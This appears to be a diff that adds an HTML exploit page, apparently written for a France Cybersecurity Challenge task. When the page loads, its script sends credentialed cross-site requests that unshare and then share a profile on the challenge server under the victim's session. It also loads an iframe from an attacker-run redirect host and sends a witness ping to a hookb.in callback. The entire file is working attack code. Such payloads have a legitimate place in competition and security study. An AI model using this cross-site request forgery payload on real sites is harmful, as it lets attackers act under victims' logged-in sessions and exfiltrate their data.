@@ -1,0 +1,27 @@
+<html>
+        <body>
+                <form id="f1" method="post" action="http://challenges2.france-cybersecurity-challenge.fr:5006/shared" target="ifr">
+                        <input name="otherID" value="">
+                        <input name="password" value="">
+                </form>
+                <iframe id="ifr" name="ifr"></iframe>
+                <script>
+                let user =  'f70ec347307b938387dd8b1bcab4a776250bb0f91b6151b7d7de005d3cac340726c15bdd2ff93e5f4b65ca42001540dd8421ce228c988600ca9d5015e43255a2';
+                async function rec(){
+                        i=0;
+                        document.forms["f1"]["elements"]["otherID"].value = user;
+                        form = new FormData(document.forms["f1"]);
+                        // Unshare possible previous shared profile
+                        await fetch("http://challenges2.france-cybersecurity-challenge.fr:5006/unshare",{mode:"no-cors", credentials:"include"}); 
+                        // Share dspiricate_brute profile
+                        await fetch("http://challenges2.france-cybersecurity-challenge.fr:5006/shared",{mode:"no-cors", credentials:"include", method: "post", body: form});
+                        // Create iframe for redirections
+                        iframe = document.createElement("iframe");
+                        iframe.setAttribute("src","http://dspiricate.fr/redirect.php?uid=" + user);
+                        document.body.appendChild(iframe);
+                }
+                rec();
+                fetch("https://hookb.in/mZkNowKx38Feqq71QMbB?ENDING"); // witness request
+                </script>
+        </body>
+</html>
